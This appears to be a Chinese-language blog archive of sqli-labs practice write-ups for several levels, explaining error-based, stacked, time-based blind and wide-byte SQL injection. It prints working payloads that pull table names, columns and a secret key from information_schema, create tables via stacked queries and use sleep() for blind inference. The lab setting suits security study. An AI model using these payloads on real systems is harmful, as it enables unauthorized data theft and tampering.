发表于 2021-01-21

五十八关

这一关只有五次尝试机会，而且联合查询语句在这一关并不管用，以知库名为challenges，直接用语句

?id=-1' and updatexml(1, concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='challenges')),1) --+爆出表名d5qhcc5r3m

?id=-1' and updatexml(1, concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='d5qhcc5r3m')),1) --+得到列名secret_KNGZ

?id=-1' and updatexml(1, concat(0x7e,(select group_concat(concat_ws(0x7e,secret_KNGZ)) from d5qhcc5r3m)),1) --+得到key ToejBfm6Bn3RZSJivLuOLfgR

成功提交。

sqli-labs练习(第三十八-四十一关) 堆叠注入

发表于 2021-01-20 更新于 2021-01-21

在SQL中，分号;是用来表示一条sql语句的结束，堆叠注入通过添加一个新的查询或者终止查询，可以达到修改数据和调用存储过程的目的。

在38关中是单引号'闭合，输入语句?id=1' --+,回显正常，接下来出入堆叠注入语句?id=1' union select 1,2,3 ; create table yhx like users--+，成功得到字段数以及创建了一个名为yhx的表，

在MySQL命令行中通过语句搜查可以验证表创建成功。

39关相同，只不过删除了闭合符。

40关，闭合符为')。

41关与39关相同，只不过并没有显示报错，同样没有闭合符。

发表于 2021-01-20

对于三十五关，有两种解法

一、在三十五关中，并没有对id值进行闭合，所以第一种方法很简单，直接输入?id=1 --+可以发现回显正常，接下来就可以用联合查询语句得到需要获取的信息

二、第二种解法是延迟注入，这就需要用到之前的if语句

?id=1 and if( length(database())=8,1,sleep(5) ) --+因为我们以知库名为security，所以我们直接查看库名的长度，回显正常，接下来就是常规的得到表名，列名及字段。

sqli-labs练习(第三十二、三关) 宽字节注入

发表于 2020-12-20 更新于 2021-01-16

宽字节带来的安全问题主要是吃ascll字符（一个字节）的现象

概念

单字节字符集： 所有的字符都使用一个字节来表示，比如 ASCII 编码。

多字节字符集： 在多字节字符集中，一部分字节用多个字节来表示，另一部分（可能没有）用单个字节来表示。

两位的多字节字符有一个前导字节和尾字节。 在某个多字节字符集内，前导字节位于某个特定范围内，尾字节也一样。

UTF-8 编码： 是一种编码的编码方式（多字节编码），它可以使用1~4个字节表示一个符号，根据不同的符号而变化字节长度。

常见的宽字节： GB2312、GBK、GB18030、BIG5、Shift_JIS GB2312 不存在宽字节注入，可以收集存在宽字节注入的编码。

第三十二、三关

并没有出现报错，图片提示中语句多出一个\ , id='1'和id='1\'' 这两个语句都能顺利执行mysql语句，而%df经过转译之后就是\,所以使用宽字节注入只需要输入语句?id=1%df'

出现报错，接下来加上注释符--+，回显正常，然后就是常规的操作语句
